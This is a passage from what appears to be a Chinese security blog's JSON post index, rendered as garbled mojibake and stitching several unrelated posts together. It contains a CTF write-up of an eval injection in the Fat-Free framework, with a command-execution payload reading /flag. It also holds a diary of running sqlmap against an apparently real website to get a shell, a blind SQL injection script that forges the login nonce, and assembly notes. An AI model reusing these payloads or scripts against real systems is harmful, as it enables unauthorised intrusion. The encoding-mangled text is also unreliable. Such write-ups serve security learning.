ä¸ºåœ¨é»‘ç›’é‡Œæˆ‘ä»¬å¯èƒ½å¯ä»¥å‘ç°ä¸€äº›çœ‹ä»£ç çš„æ—¶å€™ä¸æ³¨æ„çš„æ¼æ´ï¼Œæ¯”å¦‚è¶Šæƒ/é€»è¾‘ç­‰æ¼æ´ã€‚ åˆ†ææºç ç›®å½• æˆ‘ä»¬åœ¨è¿™ä¸ªæ­¥éª¤åªéœ€è¦å¯¹æºç ç›®å½•æœ‰ä¸ªå¤§æ¦‚çš„äº†è§£ï¼ŒçŸ¥é“æ¯ä¸ªç›®å½•é‡Œæ”¾çš„æ˜¯ä»€ä¹ˆæ–‡ä»¶å°±è¡Œäº†ï¼Œæ¯”å¦‚installç›®å½•æ”¾çš„å®‰è£…æ–‡ä»¶ï¼Œadminç›®å½•æ”¾çš„åå°ç®¡ç†ç›¸å…³çš„æ–‡ä»¶ï¼Œfunctionç›®å½•æ”¾çš„ç½‘ç«™è¿è¡Œæ—¶éœ€è¦ç”¨åˆ°çš„æ–¹æ³•çš„ç›¸å…³æ–‡ä»¶ç­‰ã€‚ åˆ†æè¿‡æ»¤æƒ…å†µ åœ¨è¿™ä¸ªæ­¥éª¤æˆ‘ä»¬è¦å¯¹æºç çš„è¿‡æ»¤æƒ…å†µè¿›è¡Œåˆ†æï¼Œçœ‹çœ‹æ˜¯å…¨å±€è¿‡æ»¤è¿˜æ˜¯å•ç‹¬å†™æŸä¸ªå‡½æ•°ç”¨äºå¯¹è¾“å…¥ç‚¹ä¸€ä¸ªä¸ªçš„è¿‡æ»¤ã€‚ å®¡è®¡å¯¹è±¡æ³¨æ„ç‚¹å±é™©å‡½æ•°äº”å¤§ç‰¹æ€§1.èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç çš„å‡½æ•°2.å¸¸è§èƒ½å¤Ÿè¯»å–ç½‘ç»œèµ„æºçš„å‡½æ•°3.èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è€…è°ƒç”¨å¤–éƒ¨ç¨‹åºçš„å‡½æ•°4.èƒ½å¤Ÿæ“ä½œæ–‡ä»¶ï¼ˆè¯»å–ã€ç§»åŠ¨ã€åˆ é™¤ï¼‰çš„å‡½æ•°5.èƒ½ä¿®æ”¹è¿è¡Œæ—¶å€™çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆè¦†ç›–å˜é‡/å‡½æ•°ï¼‰ ä»»æ„æ‰§è¡Œä»£ç å‡½æ•°ï¼š1.æŠŠä¼ å…¥çš„å­—ç¬¦ä¸²å½“åšphpä»£ç ç›´æ¥æ‰§è¡Œ: 2.å¼•å…¥æ–‡ä»¶æ‰§è¡Œphpä»£ç ï¼Œphpé‡Œå¼•å…¥æ–‡ä»¶æ‰§è¡Œä»£ç çš„å‡½æ•°: 3.ç¬¬3ç§æ˜¯ä¸€äº›æ•°æ®å¤„ç†å‡½æ•°,å®ƒä»¬å­˜åœ¨æ”¯æŒå›è°ƒå‡½æ•°ç±»å‹çš„å‚æ•°,è¿™ä¸ªå‚æ•°å¯ä»¥ä¼ å…¥å‡½æ•°çš„å­—ç¬¦ä¸²åç§°,ä¸€æ—¦è¿™ä¸ªå‚æ•°å¯æ§,é‚£ä¹ˆå¯èƒ½é€ æˆæ¼æ´,è¿™äº›å‡½æ•°çš„ç‰¹å¾éå¸¸æ˜æ˜¾,å‚æ•°ç±»å‹æ˜¯callbackå½¢å¼,å®¡è®¡çš„åŸºæœ¬ä¸Šå°±æ˜¯çœ‹ä»–ä»¬çš„å›è°ƒå‡½æ•°æ˜¯ä¸æ˜¯ç”¨å­—ç¬¦ä¸²çš„å½¢å¼ä¼ é€’,æ˜¯å¦å¯æ§,åœ¨PHPé‡Œå­˜åœ¨å¤§é‡çš„è¿™ç§å‡½æ•°,è¿™é‡Œåªä¸¾5ä¸ªæ¯”è¾ƒå¸¸è§çš„ èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è€…è°ƒç”¨å¤–éƒ¨ç¨‹åºçš„å‡½æ•°èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è€…è°ƒç”¨å¤–éƒ¨ç¨‹åºçš„å‡½æ•°,è¿™äº›å‡½æ•°ä½¿ç”¨ä¸å½“å®¹æ˜“å¼•èµ·å‘½ä»¤æ³¨å…¥,ä¸€èˆ¬éœ€è¦é€šå¸¸éœ€è¦ç»“åˆescapeshellcmdæˆ–escapeshellargå‡½æ•°è¿‡æ»¤ä¼ å…¥çš„å˜é‡ èƒ½å¤Ÿæ“ä½œæ–‡ä»¶(è¯»å†™,ç§»åŠ¨,åˆ é™¤)çš„å‡½æ•°èƒ½å¤Ÿæ“ä½œæ–‡ä»¶(è¯»å†™,ç§»åŠ¨,åˆ é™¤)çš„å‡½æ•°,åœ¨å®¡è®¡çš„æ—¶å€™ä¹Ÿè¦æ³¨æ„ä¼ å…¥çš„å˜é‡æ˜¯å¦å¯æ§,æ˜¯å¦å­˜åœ¨ç©¿è¶Šç›®å½•,å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å†™çš„æƒ…å†µ èƒ½å¤Ÿä¿®æ”¹è¿è¡Œæ—¶å€™çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ(è¦†ç›–å˜é‡/å‡½æ•°) å®æˆ˜ä¸‹è½½ fat-freeæ¡†æ¶æºç ï¼Œå°†é¢˜ç›®æ¢æˆæºç  1234567891011121314&lt;?php// Kickstart the framework$f3=require('lib/base.php');$f3-&gt;set('DEBUG',1);if ((float)PCRE_VERSION&lt;8.0) trigger_error('PCRE version is out of date');// Load configurationhighlight_file(__FILE__);$a=$_GET['a'];unset($f3-&gt;$a);$f3-&gt;run(); è¿™è¾¹åŒ…å«äº†ä¸€ä¸ªbase.phpæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥å»base.phpä¸­æŸ¥çœ‹ï¼Œæœç´¢ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰å±é™©å‡½æ•°ï¼šåœ¨clear()æ–¹æ³•ä¸­æŸ¥æ‰¾åˆ°evalå‡½æ•°ï¼Œäºæ˜¯ä¼ å…¥å‚æ•°ï¼Œç›´æ¥å®šä½åˆ°è¿™é‡Œé¢çœ‹çœ‹ 12345var_dump($key);var_dump($this-&gt;compile('@hive'.$key,FALSE));$val=preg_replace('/^(\\$hive)/','$this-&gt;hive',$this-&gt;compile('@hive.'.$key,FALSE));var_dump('unset('.$val.');');eval('unset('.$val.');'); è¿™é‡Œç”»ä¸ªé‡ç‚¹å…¶å®ä¹‹å‰åœ¨å­¦CåŸå› çš„æ—¶å€™ä¹Ÿæœ‰è¿™æ ·çš„è°ƒè¯•æ–¹æ³•ï¼Œå¯èƒ½æ˜¯å¤ªä¹…æ²¡å†™ä»£ç äº†ï¼Œéƒ½ç»™å¿˜äº†ï¼ŒçœŸæ˜¯æ— è¯­å“ˆå“ˆå“ˆå¯ä»¥çœ‹åˆ°è¾“å…¥å†…å®¹ï¼Œæ­¤æ—¶ç›´æ¥åœ¨urlä¸Šæ„é€ payloadå³å¯ å¦‚æœä¸å®šä½çš„è¯ï¼š æ–­ç‚¹æ‰“åœ¨getè¯­å¥ï¼Œç›´æ¥æ­¥å…¥è·Ÿè¸ªï¼š åŸæ¥è¿™ä¸ªunsetå‡½æ•°é‡æ–°å®šä¹‰äº†ï¼š ç»§ç»­è·Ÿè¿›:è¿›å…¥clearæ–¹æ³•ä¸­ï¼š keyä¸ºæˆ‘ä»¬ä¼ å…¥çš„å€¼ ä¸ºcacheå°±è¿›å…¥ä»¥ä¸‹åˆ¤æ–­ï¼Œçœ‹äº†ä¸€ä¸‹ ä¼¼ä¹æ²¡æœ‰å¯¹æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼šåˆ°äº†evalå‡½æ•°è¿™é‡Œï¼š åœ¨è¿™é‡Œè¿›è¡Œæ­£åˆ™åŒ¹é…çš„è¿‡æ»¤ï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¸‹å…¶ä»–çš„payloadï¼Œè¯´æ˜¯æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¸‹ å‘ç°æ²¡æœ‰å‘€ï¼Œç„¶åæ­¤æ—¶åªéœ€è¦å¯¹è¿™é‡Œè¿›è¡Œpayloadçš„æ„é€ å°±è¡Œäº†,æ•´ä¸ªæµç¨‹è¿˜æŒºæ˜ç¡®çš„ï¼Œå°±æ˜¯ç”¨æˆ·ä¼ å…¥çš„å€¼ ä¼šè¿›å…¥åˆ°clear()å‡½æ•°ä¸­ï¼ŒæœŸé—´ä¹Ÿæ²¡ä»€ä¹ˆç»•å¼¯å­çš„åœ°æ–¹ã€‚ã€‚æ¥ä¸‹æ¥éœ€è¦åšçš„å°±æ˜¯æ„é€ payloadé—­åˆå‰é¢çš„å†…å®¹å®ç°evalå‘½ä»¤æ‰§è¡Œ: 1?a=a['/']);phpinfo( ç”±äºåé¢ä¼šæ‹¼æ¥å›æ¥ä¸€ä¸ª);æ‰€ä»¥è¿™é‡Œåé¢çš„å†…å®¹å¯ä»¥ä¸è¦ï¼Œä½†æ˜¯è¦æ‰§è¡Œå…¶ä»–å‘½ä»¤è¦å§åé¢çš„å†…å®¹ç»™æ³¨é‡Šæ‰ï¼Œæ‰€ä»¥payloadä¸º: 1xxxxxxxxxx ?a=a['/']);system('cat /flag');// å°ç»“:å…³äºæ”¶è·ï¼š1.å¯¹äºè°ƒè¯•å…¶å®å·²ç»ä¸ç®—é™Œç”Ÿäº†ï¼Œæ‹¿åˆ°é¢˜ç›®è·å¾—æºç åå…¶å®æˆ‘æ˜¯æœ‰ç‚¹æ— ä»ä¸‹æ‰‹çš„ï¼Œæ„Ÿè§‰æ˜¯å¤ªä¹…æ²¡è°ƒè¯•æ‰‹ç”Ÿäº†ï¼Œé€šè¿‡è¿™é¢˜ï¼Œä»¥åå°±è¦è®°å¾—è°ƒè¯•çš„åŸºæ“äº†ï¼Œå°¤å…¶æ˜¯é€šè¿‡è¾“å‡ºå„ä¸ªå˜é‡ç¡®å®šæˆ‘ä»¬è¾“å…¥çš„å€¼ï¼Œä»è€Œè¾¾åˆ°æˆåŠŸæ„é€ å‡ºé—­åˆè¯­å¥çš„æ•ˆæœ","link":"/2021/04/04/%E7%BA%A2%E8%B0%B7%E6%9D%AF-%E8%99%8E%E7%AC%A6%E6%AF%94%E8%B5%9Bwp/"},{"title":"è®°å½•ä¸€æ¬¡ä¸å®Œå…¨ç®€å•çš„æ¸—é€æµ‹è¯•","text":"å¼•è¯­ï¼šä¹‹å‰æ‰“æ¯”èµ›ä¹‹å‰ï¼Œå­¦é•¿ç»™æˆ‘æ¨äº†ä¸€ä¸ªç½‘ç«™ï¼Œè®©æˆ‘å»å°è¯•æ‹¿shell,æ¯•ç«Ÿæ˜¯ç¬¬ä¸€æ¬¡ï¼Œè¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ•…è®°å½•ä¸€ä¸‹ã€‚ SQLæ³¨å…¥å­¦é•¿è·Ÿæˆ‘è¯´ï¼Œå­˜åœ¨sqlæ³¨å…¥ç‚¹ï¼Œå¹¶ä¸”ç»™æˆ‘æ¨é€çš„ç½‘é¡µä¸€æ‰“å¼€ï¼Œå‡ºç°è¿™ä¸¤ä¸ªæ¡†ï¼Œåˆšåˆ·å®Œé¶åœºçš„æˆ‘ï¼Œä¸€çœ‹åˆ°è¿™ä¸ªå°±ä»¥ä¸ºæ³¨å…¥ç‚¹åœ¨è¿™é‡Œï¼Œåœ¨å°è¯•äº†å‡ æ¬¡æ— æœä¹‹åï¼Œå†³å®šåˆ©ç”¨sqlmapè·‘ä¸€ä¸‹ï¼Œåˆ©ç”¨è·‘POSTçš„æ–¹æ³•ï¼Œè·‘äº†å¥½å‡ æ¬¡ï¼Œéƒ½æ²¡æœ‰ä»»ä½•ç»“æœï¼Œæˆ‘ä¸ç¦åœ¨æƒ³ï¼Œä¹Ÿè®¸æ³¨å…¥ç‚¹ä¸åœ¨è¿™é‡Œï¼Œå¹¶ä¸”ç»§ç»­ç”¨postçš„æ–¹æ³•ï¼Œåœ¨æ–‡æœ¬ä¸Šçš„refererã€cookieç­‰å¤„åŠ *å·ï¼Œå®šç‚¹æ‰«ææ³¨å…¥ç‚¹ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰ç»“æœåæ¥ç»è¿‡å­¦é•¿ç‚¹é†’ï¼Œæˆ‘å›åˆ°ç½‘é¡µåœ¨urlä¸Šå¯»æ‰¾ï¼Œå‘ç°ï¼Œå½“æˆ‘åˆ‡æ¢è‹±æ–‡çš„æ—¶å€™ è¿™ä¸ª?lang=4åé¢çš„æ•°å­—å‘ç”Ÿäº†æ”¹å˜ï¼ŒçŒœæƒ³æ˜¯ä¸æ˜¯åœ¨è¿™é‡Œï¼Œåæ¥ç”¨sqlmapè·‘äº†ä¸€ä¸‹ï¼Œæœç„¶åœ¨è¿™é‡Œ ä»¥ä¸Šæ˜¯è·‘å‡ºæ¥çš„æ•°æ®åº“ï¼Œä¸è¿‡æˆ‘ä»¬çš„ç›®æ ‡ä¸æ˜¯è¿™ä¸ªï¼Œè€Œæ˜¯æ‹¿shell é—®é¢˜1ï¼šä¸ºä»€ä¹ˆæˆ‘ç”¨postçš„æ–¹å¼è·‘referçš„æ—¶å€™ è·‘ä¸å‡ºæ¥å‘¢ sqlmap â€“os-shellåå¼¹shellæˆ‘è®°å¾—åœ¨ä¸Šä¸€æ¬¡çš„æ—¶å€™å¯ä»¥ç›´æ¥åå¼¹ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥è¿™æ¬¡ä¸è¡Œï¼Œå¤§æ¦‚æ˜¯è·¯å¾„æ¢äº†ï¼Ÿæ‰€ä»¥éœ€è¦å¯»æ‰¾ç»å¯¹è·¯å¾„","link":"/2021/01/14/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"title":"é€†å‘å…¥é—¨ï¼ˆä¸€ï¼‰","text":"","link":"/2021/05/09/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"æ±‡ç¼–å­¦ä¹ ","text":"1.1è®¡ç®—æœºç³»ç»Ÿæ¦‚è¿°ç¡¬ä»¶ç³»ç»Ÿï¼šæ„æˆè®¡ç®—æœºçš„å„ç§ç‰©è´¨å®ä½“çš„æ€»å’Œè½¯ä»¶ç³»ç»Ÿï¼šè®¡ç®—æœºä¸Šå…¨éƒ¨å¯è¿è¡Œç¨‹åºçš„æ€»å’Œ x86å¾®å¤„ç†å™¨çš„ç»“æ„æŒ‡ä»¤æ‰§è¡Œå•å…ƒEUEUéƒ¨åˆ†è´Ÿè´£æŒ‡ä»¤çš„æ‰§è¡Œï¼Œç”±ALUã€æ ‡å¿—å¯„å­˜å™¨ã€é€šç”¨å¯„å­˜å™¨ã€æ•°æ®å¯„å­˜å™¨å’ŒEUæ§åˆ¶å•å…ƒç»„æˆï¼Œä¸ä¸ç³»ç»Ÿå¤–çº¿ç›¸è¿ä¸»è¦å®ç°ä¸¤ç§æ“ä½œ:1.æ ¹æ®æŒ‡ä»¤è¿›è¡Œç®—æ•°/é€»è¾‘è¿ç®—ï¼›2.EUè®¡ç®—å‡ºæŒ‡ä»¤è¦æ±‚å¯»å€å•å…ƒåœ°å€çš„åç§»é‡ï¼Œé€BIUï¼Œä»¥å½¢æˆä¸€ä¸ª20ä½çš„ç‰©ç†åœ°å€ï¼Œåˆ°å­˜å‚¨å™¨å­˜å–æ‰€è¦æ±‚çš„çš„æ“ä½œæ•° æ€»çº¿æ¥å£å•å…ƒBIUBIUè´Ÿè´£ä¸å­˜å‚¨å™¨æ¥å£â€”â€”CPUå’Œå­˜å‚¨å™¨ä¹‹é—´çš„ä¿¡æ¯ä¼ é€ç”±åœ°å€åŠ æ³•å™¨ã€æ®µå¯„å­˜å™¨ï¼ˆCSã€DSã€ESã€SSï¼‰ã€æŒ‡ä»¤æŒ‡é’ˆIPã€æŒ‡ä»¤é˜Ÿåˆ—å’Œæ€»çº¿æ§åˆ¶é€»è¾‘ç»„æˆã€‚ å’ŒæŒ‡ä»¤é˜Ÿåˆ—ä¹‹é—´çš„åˆä½œæŒ‡ä»¤é˜Ÿåˆ—æ˜¯ä¸€ä¸ª6å­—èŠ‚çš„å¯„å­˜å™¨ï¼Œé˜Ÿåˆ—ä¸­åŒæ—¶æœ€å¤šå¯å­˜6ä¸ªå­—èŠ‚æŒ‡ä»¤ã€æ˜¯ä¸€ä¸ªå…ˆè¿›å…ˆå‡ºçš„æ ˆã€‚å½“æŒ‡ä»¤é˜Ÿåˆ—ç©ºçš„æ—¶å€™ï¼ŒBIUè‡ªåŠ¨æ‰§è¡Œæ€»çº¿æ“ä½œï¼Œå–æŒ‡ä»¤å­˜å…¥æŒ‡ä»¤é˜Ÿåˆ—ã€‚å½“ç¨‹åºå‘ç”Ÿè½¬ä¹‰çš„æ—¶å€™ï¼Œåˆ™BIUè¦é‡æ–°å–å‡ºæŒ‡ä»¤ï¼Œè¿™æ˜¯ BIUå–å‡ºçš„æŒ‡ä»¤å°†ç›´æ¥é€EUæ‰§è¡Œï¼Œç„¶åBIUå°†ä¸æ–­å–æŒ‡ä»¤å¡«å…¥æŒ‡ä»¤é˜Ÿåˆ—ä¸­ï¼Œå½“æŒ‡ä»¤æœ‰å†™å­˜å‚¨å™¨è¦æ±‚ï¼Œåˆ™é€šçŸ¥BIUï¼Œç”±BIUæŠŠæŒ‡ä»¤ç»“æœå†™åˆ°å­˜å‚¨å™¨ä¸­ï¼Œç„¶åå†å»æŒ‡ä»¤åˆ°æŒ‡ä»¤é˜Ÿåˆ—ä¸­ X86å¯„å­˜å™¨æ•°æ®å¯„å­˜å™¨ã€æŒ‡é’ˆåŠå˜å€å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨ã€æ§åˆ¶å¯„å­˜å™¨ 1.æ•°æ®å¯„å­˜å™¨åŒ…æ‹¬AXã€BCã€CXå’ŒDXå››ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œå®ƒä»¬ç”¨æ¥æš‚æ—¶å­˜æ”¾è¿ç®—è¿‡ç¨‹ä¸­æ‰€ç”¨åˆ°çš„æ“ä½œæ•°ã€ç»“æœæ•°æ®æˆ–å…¶ä»–ä¿¡æ¯ï¼Œæ—¢å¯ä»¥ä»¥16ä½å­—é•¿çš„å½¢å¼æ¥ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨8ä½å­—èŠ‚çš„å½¢å¼ä½¿ç”¨ AXä½œä¸ºç´¯åŠ å™¨ï¼Œè‡ªä¹˜æ—¶æä¾›ä¸€ä¸ªæ“ä½œæ•°å¹¶å­˜æ”¾ç§¯çš„ä½ä½ï¼Œå­—é™¤æ—¶æä¾›è¢«é™¤æ•°çš„ä½ä½å¹¶å­˜æ”¾å•†ã€‚å¦å¤–ï¼Œæ‰€æœ‰çš„è¾“å…¥è¾“å‡ºæŒ‡ä»¤éƒ½æ˜¯ç”¨è¿™ä¸€å¯„å­˜å™¨ä¸å¤–éƒ¨è®¾å¤‡ä¼ é€ä¿¡æ¯ BXå¯ä»¥ç”¨ä½œé€šç”¨å¯„å­˜å™¨ï¼›åœ¨è®¡ç®—å­˜å‚¨å™¨åœ°å€æ—¶ï¼Œå®ƒç»å¸¸ç”¨ä½œåŸºå€å¯„å­˜å™¨ï¼›åœ¨XLATæŒ‡ä»¤ä¸­æä¾›è¢«æŸ¥è¡¨æ ¼ä¸­æºæ“ä½œæ•°çš„é—´æ¥åœ°å€ 2.æŒ‡é’ˆåŠå˜å€å¯„å­˜å™¨SPã€BPã€SIã€DIå››ä¸ªåå…­ä½å¯„å­˜å™¨ X86æŒ‡ä»¤é›†çš„åŸºæœ¬ç‰¹è‰²1.å‘ä¸‹å…¼å®¹ï¼ˆå¯¹å‰ä¸€ä»£å¤„ç†å™¨çš„æ‰©å±•ï¼‰2.å˜é•¿æŒ‡ä»¤1-15å­—èŠ‚ï¼Œå¤šæ•°ä¸º2-3å­—èŠ‚é•¿åº¦3.å¤šç§å¯»å€æ–¹å¼ï¼ˆå¯è®¿é—®ä¸å¯¹é½å†…å­˜åœ°å€4.æŒ‡ä»¤é›†çš„é€šç”¨å¯„å­˜å™¨ä¸ªæ•°æœ‰é™x86-32ç³»ç»Ÿä¸‹æ‹¥æœ‰8ä¸ªé€šç”¨å¯„å­˜å™¨ï¼ˆx86-64æ‹“å±•åˆ°16ä¸ªï¼‰è‡³å¤šèƒ½æœ‰ä¸€ä¸ªæ“ä½œæ•°åœ¨å†…å­˜ä¸­ï¼Œå¦ä¸€ä¸ªæ“ä½œæ•°ä¸ºç«‹å³æ•°æˆ–è€…å¯„å­˜å™¨","link":"/2021/02/21/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"},{"title":"iæ˜¥ç§‹12","text":"webâ€”â€”Mangageræ„Ÿè§‰å°±åƒæ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†â€™ æ‰€ä»¥è¦å¯»æ‰¾ä¸€ä¸‹å…¶ä»–ä¿¡æ¯ï¼Œ æŸ¥çœ‹æºç ï¼Œå‘ç° 123456789101112131415161718$(document).keydown(function(e) { if (e.keyCode == 222 || e.keyCode == 188 || e.keyCode == 190) { alert(&quot;Illegal character&quot;); return false; }});function getnonce() { var text = &quot;&quot;; var possible = &quot;0123456789abcdef&quot;; for (var i = 0; i &lt; 40; i++) text += possible.charAt(Math.floor(Math.random() * possible.length)); return text;}$('#submit').click(function() { this._nonce = getnonce();});'' Jsçœ‹ä¸å¤ªæ‡‚ï¼Œç™¾åº¦å®Œå„ä¸ªå‡½æ•°åå¤§è‡´å¯ä»¥çŸ¥é“:textçš„é•¿åº¦ä¸º40æ¯ä¸ªå­—ç¬¦çš„ç®—æ³•æ˜¯ï¼Œå…ˆå¾—åˆ°ä¸€ä¸ªéšæœºæ•°ï¼Œç„¶å*possibleçš„é•¿åº¦ï¼Œæœ€åå–æ•´ï¼Œçœ‹æ˜¯å¤šå°‘ï¼Œç„¶åå†possibleé‡Œé¢å»è¿™ä¸ªæ˜¯ç”¨æ¥ç”Ÿæˆæäº¤æ—¶çš„ä¸€ä¸ªéªŒè¯çš„ä½†æ˜¯å½“æˆ‘ä»¬è¾“å…¥ä¸¤ä¸ªä¸€æ ·çš„usernameçš„æ—¶å€™ï¼Œ_nonceçš„å€¼æ˜¯ä¸å˜çš„äºæ˜¯å†å»çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132function sign (data, key) { var privateKey var i, j var W = new Array(80) var A, B, C, D, E var H0 = 0x97B5D3F1 var H1 = 0x1F3D5B79 var H2 = 0x684A2C0E var H3 = 0xE0C2A486 var H4 = 0x33221100 var H5 = 0xF0F0F0F0 var temp var _RSA = function (n, s) { var t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s)) return t4 } var _Rot = function (val) { var str = '' var i var v for (i = 7; i &gt;= 0; i--) { v = (val &gt;&gt;&gt; (i * 4)) &amp; 0x0f str += v.toString(16) } return str } str = unescape(encodeURIComponent(key + data)) var strLen = str.length var wordArray = [] for (i = 0; i &lt; strLen - 3; i += 4) { j = str.charCodeAt(i) &lt;&lt; 24 | str.charCodeAt(i + 1) &lt;&lt; 16 | str.charCodeAt(i + 2) &lt;&lt; 8 | str.charCodeAt(i + 3) wordArray.push(j) } switch (strLen % 4) { case 0: i = 0x080000000 break case 1: i = str.charCodeAt(strLen - 1) &lt;&lt; 24 | 0x0800000 break case 2: i = str.charCodeAt(strLen - 2) &lt;&lt; 24 | str.charCodeAt(strLen - 1) &lt;&lt; 16 | 0x08000 break case 3: i = str.charCodeAt(strLen - 3) &lt;&lt; 24 | str.charCodeAt(strLen - 2) &lt;&lt; 16 | str.charCodeAt(strLen - 1) &lt;&lt; 8 | 0x80 break } wordArray.push(i) while ((wordArray.length % 16) !== 14) { wordArray.push(0) } wordArray.push(strLen &gt;&gt;&gt; 29) wordArray.push((strLen &lt;&lt; 3) &amp; 0x0ffffffff) H0 ^= H5 H1 ^= H5 H2 ^= H5 H3 ^= H5n c H4 ^= H5 for (privateKey = 0; privateKey &lt; wordArray.length; privateKey += 16) { for (i = 0; i &lt; 16; i++) { W[i] = wordArray[privateKey + i] } for (i = 16; i &lt;= 79; i++) { W[i] = _RSA(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1) } A = H0 B = H1 C = H2 D = H3 E = H4 for (i = 0; i &lt;= 19; i++) { temp = (_RSA(A, 5) + ((B &amp; C) | (~B &amp; D)) + 0x5A820000 + E + W[i] + 0x00007999) &amp; 0x0ffffffff E = D D = C C = _RSA(B, 30) B = A A = temp } for (i = 20; i &lt;= 39; i++) { temp = (_RSA(A, 5) + (B ^ C ^ D) + 0x6ED90000 + E + W[i] + 0x0000EBA1) &amp; 0x0ffffffff E = D D = C C = _RSA(B, 30) B = A A = temp } for (i = 40; i &lt;= 59; i++) { temp = (_RSA(A, 5) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + 0x8F1B0000 + E + W[i] + 0x0000BCDC) &amp; 0x0ffffffff E = D D = C C = _RSA(B, 30) B = A A = temp } for (i = 60; i &lt;= 79; i++) { temp = (_RSA(A, 5) + (B ^ C ^ D) + 0xCA620000 + E + W[i] + 0x0000C1D6) &amp; 0x0ffffffff E = D D = C C = _RSA(B, 30) B = A A = temp } H0 = (H0 + A) &amp; 0x0ffffffff H1 = (H1 + B) &amp; 0x0ffffffff H2 = (H2 + C) &amp; 0x0ffffffff H3 = (H3 + D) &amp; 0x0ffffffff H4 = (H4 + E) &amp; 0x0ffffffff } temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4) return temp.toLowerCase() }$(document).ready(function() { $(&quot;#&quot; + &quot;f&quot; + &quot;r&quot; + &quot;m&quot; + &quot;l&quot; + &quot;o&quot; + &quot;g&quot; + &quot;i&quot; + &quot;n&quot;).submit(function(e) { var z1 = $(&quot;#&quot; + &quot;u&quot; + &quot;s&quot; + &quot;e&quot; + &quot;r&quot; + &quot;n&quot; + &quot;a&quot; + &quot;m&quot; + &quot;e&quot;).val(); var z2 = $(&quot;#&quot; + &quot;p&quot; + &quot;a&quot; + &quot;s&quot; + &quot;s&quot; + &quot;w&quot; + &quot;o&quot; + &quot;r&quot; + &quot;d&quot;).val(); $('&lt;' + 'i' + 'n' + 'p' + 'u' + 't' + '&gt;').attr({ type: 'h' + 'i' + 'd' + 'd' + 'e' + 'n', name: '_' + 'n' + 'o' + 'n' + 'c' + 'e', value: sign(z1 + z2, &quot;YTY&quot; + &quot;0Yj&quot; + &quot;M0Y&quot; + &quot;2Rh&quot; + &quot;ZTZ&quot; + &quot;iMj&quot; + &quot;liZ&quot; + &quot;jFj&quot; + &quot;OTQ&quot; + &quot;xOD&quot; + &quot;==&quot;) }).appendTo('#' + 'f' + 'r' + 'm' + 'l' + 'o' + 'g' + 'i' + 'n'); });}); è¿™é‡Œæ‰¾åˆ°ä¸¤éƒ¨åˆ†æºç ï¼Œå¯ä»¥å‘ç°_nonceæ˜¯key+username+passwordç»„æˆçš„ï¼Œæ¥ä¸‹æ¥é€šè¿‡SHA1ï¼ˆå› ä¸ºè¿™é‡Œæ˜¯80ä¸ªå­—ç¬¦ï¼‰çš„åŠ å¯†å¾—åˆ°çš„ã€‚ æ¥ä¸‹æ¥å°†usernameæ¢æˆæ³¨å…¥è¯­å¥è¯•è¯• å½“æˆ‘ä»¬ä½¿ç”¨adminâ€™and 1=1#çš„æ—¶å€™ é¡µé¢å›æ˜¾æ˜¯Incorrect password! å½“æˆ‘ä»¬ä½¿ç”¨adminâ€™and 1=2#æ—¶ï¼Œé¡µé¢å›æ˜¾æ˜¯User name does not existæ­¤æ—¶ï¼Œè¿™é‡Œå°±å¯ä»¥ä½¿ç”¨ç›²æ³¨è„šæœ¬ï¼Œç¼–å†™ä¸€ä¸‹: 123456789101112131415161718192021import requestsimport hashlibs=requests.session()url=r&quot;http://83cb089ea0e440d5a7c26fb473e06defc9a769f1f7394b84.changame.ichunqiu.com/login.php&quot;headers=s.get(url).headerspayload=&quot;0123456789abcdefghijklmnopqrstuvwxyzQWERTYUIOPLKJHGFDSAZXCVBNM!@#$%^&amp;*()_+}{&quot;text=&quot;1&quot;pass_go=&quot;&quot;fi_result=&quot;&quot;null=&quot;&quot;for i in range(1,50): for j in payload: pass_go=f&quot;admin'and substr(database(),{i},1)='{j}'#&quot; hash_encode =&quot;YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD==&quot;+pass_go+&quot;1&quot; hash_encode = hashlib.sha1(hash_encode.encode(&quot;utf-8&quot;)).hexdigest() data ={&quot;username&quot;:pass_go,&quot;passwowrd&quot;:&quot;1&quot;,&quot;submit&quot;:&quot;&quot;,&quot;_nonce&quot;:hash_encode} print(data) print(s.post(url,headers=headers,data=data).text) if &quot;Incorrect password!&quot; in s.post(url,headers=headers,data=data).text: fi_result+=j print(fi_result) åå¤æ£€æŸ¥äº†å¥½å‡ 